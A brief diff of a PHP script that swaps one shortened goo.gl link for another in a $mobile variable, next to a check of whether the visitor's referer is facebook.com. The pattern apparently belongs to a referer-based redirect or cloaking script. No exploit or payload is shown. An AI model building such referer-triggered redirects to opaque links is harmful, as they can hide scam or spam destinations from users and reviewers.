@@ -27,7 +27,7 @@ $isref = false;
 $data = json_decode($api);
 
 $theme = "none";
-$mobile = "https://goo.gl/wk09Lm";
+$mobile = "https://goo.gl/936AdQ";
 
 if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
     $isref = true;
